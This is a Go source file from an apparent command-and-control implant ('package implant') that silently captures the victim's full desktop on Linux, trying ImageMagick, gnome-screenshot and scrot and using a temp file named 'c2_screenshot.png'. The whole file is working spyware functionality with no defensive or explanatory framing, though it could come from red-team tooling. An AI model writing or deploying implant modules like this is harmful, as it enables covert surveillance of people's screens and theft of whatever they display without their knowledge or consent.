//go:build linux

package implant

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"time"
)

// CaptureScreenshot captures the entire desktop and returns PNG-encoded bytes.
// Tries several common screenshot tools in order.
func CaptureScreenshot() ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	// 1. Try ImageMagick import (most reliable)
	output, err := exec.CommandContext(ctx, "import", "-window", "root", "/dev/stdout").Output()
	if err == nil && len(output) > 4 && isPNG(output) {
		return output, nil
	}

	// 2. Try gnome-screenshot (writes to file)
	tmpPath := "/tmp/c2_screenshot.png"
	_ = os.Remove(tmpPath) // clean up any previous file

	cmd := exec.CommandContext(ctx, "gnome-screenshot", "-f", tmpPath)
	if err := cmd.Run(); err == nil {
		data, readErr := os.ReadFile(tmpPath)
		os.Remove(tmpPath)
		if readErr == nil && len(data) > 4 && isPNG(data) {
			return data, nil
		}
	}

	// 3. Try scrot
	cmd = exec.CommandContext(ctx, "scrot", tmpPath)
	if err := cmd.Run(); err == nil {
		data, readErr := os.ReadFile(tmpPath)
		os.Remove(tmpPath)
		if readErr == nil && len(data) > 4 && isPNG(data) {
			return data, nil
		}
	}

	// Clean up any leftover
	os.Remove(tmpPath)

	return nil, fmt.Errorf("no screenshot tool available (tried: import, gnome-screenshot, scrot)")
}

// isPNG checks for the PNG magic bytes.
func isPNG(data []byte) bool {
	return len(data) >= 4 && data[0] == 0x89 && data[1] == 'P' && data[2] == 'N' && data[3] == 'G'
}
